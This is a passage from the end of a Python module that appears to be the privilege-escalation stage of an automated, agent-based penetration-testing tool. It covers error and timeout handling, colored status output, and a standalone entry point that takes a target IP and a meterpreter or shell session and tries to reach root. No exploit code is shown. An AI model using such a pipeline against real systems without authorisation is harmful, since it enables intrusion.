        return PrivEscFindings(
            success=False,
            technique="error",
            previous_level=access_level,
            new_level=access_level,
            summary=f"PrivEsc crashed: {str(e)[:200]}",
            session_id=str(session_id or ""),
            session_type=session_type or "",
        )

    final_snapshot = app.get_state(config)
    final_state = final_snapshot.values

    findings = _extract_privesc_findings(final_state)
    if _timed_out and not findings.get("success"):
        findings["technique"] = findings.get("technique") or "timeout"
        findings["summary"] = (
            f"Escalation time-boxed at {PRIVESC_WALLCLOCK_TIMEOUT}s without "
            f"reaching root. " + findings.get("summary", "")
        )

    print_colored(f"\n{'='*60}", Colors.HEADER)
    print_colored(
        f"[run_privesc] Complete — success={findings['success']}",
        Colors.OKGREEN if findings["success"] else Colors.FAIL
    )
    print_colored(f"  {findings['summary']}", Colors.OKCYAN)
    print_colored(f"{'='*60}\n", Colors.HEADER)

    return findings

# =============================================================================
# STANDALONE MAIN
# =============================================================================

def main():
    if "--graph" in sys.argv:
        workflow = build_graph()
        app = workflow.compile()
        try:
            print(app.get_graph().draw_ascii())
        except Exception:
            graph = app.get_graph()
            print("Nodes:", [n for n in graph.nodes])
            print("Edges:", [(e.source, e.target) for e in graph.edges])
        return

    print_colored("--- PrivEsc Stage (Standalone) ---", Colors.OKGREEN)
    print_colored("Nodes: enumerator → planner → executor → critic (3-way routing)", Colors.OKCYAN)

    target_ip = input("\n[Target IP]: ").strip()
    session_id = input("[Session ID]: ").strip()
    session_type = input("[Session Type (command_shell/meterpreter)]: ").strip() or "command_shell"
    access_level = input("[Access Level (user/root)]: ").strip() or "user"
    os_info = input("[OS Info (optional)]: ").strip()

    findings = run_privesc(
        target_ip=target_ip,
        session_id=session_id,
        session_type=session_type,
        access_level=access_level,
        os_info=os_info,
    )

    print("\n" + json.dumps(dict(findings), indent=2, default=str))


if __name__ == "__main__":
    main()